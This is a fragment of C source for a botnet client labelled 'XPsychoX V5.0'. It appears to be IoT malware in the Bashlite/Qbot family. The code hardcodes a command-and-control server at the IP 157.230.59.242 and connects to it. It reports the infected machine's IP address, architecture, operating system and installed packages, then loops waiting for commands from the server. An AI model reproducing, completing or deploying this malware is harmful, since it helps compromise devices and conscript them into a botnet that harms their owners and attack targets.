...
#include <net/if.h>
//////////////////////////////////
#define SERVER_LIST_SIZE (sizeof(XPsychoXserv) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
...
/////////////////////////////////////////
unsigned char *XPsychoXserv[] = {"157.230.59.242:666"};
/////////////////////////////////////////
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int XPsychoXicsock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
...
int recvLine(int socket, unsigned char *buf, int bufsize)
{
        ...
        while(bufsize-- > 1)
        {
                if(recv(XPsychoXicsock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
...
int initConnection()
{
        ...
        memset(server, 0, 512);
        if(XPsychoXicsock) { close(XPsychoXicsock); XPsychoXicsock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, XPsychoXserv[currentServer]);
        int port = 6982;
        ...
        XPsychoXicsock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(XPsychoXicsock, server, port, 30)) return 1;
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(XPsychoXicsock, "\x1b[1;31mXPsychoX\x1b[1;37m[\x1b[1;31mV5.0\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]", inet_ntoa(ourIP), defarchs(), defopsys(), defpkgs());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(XPsychoXicsock, commBuf, 4096)) != -1)
                {
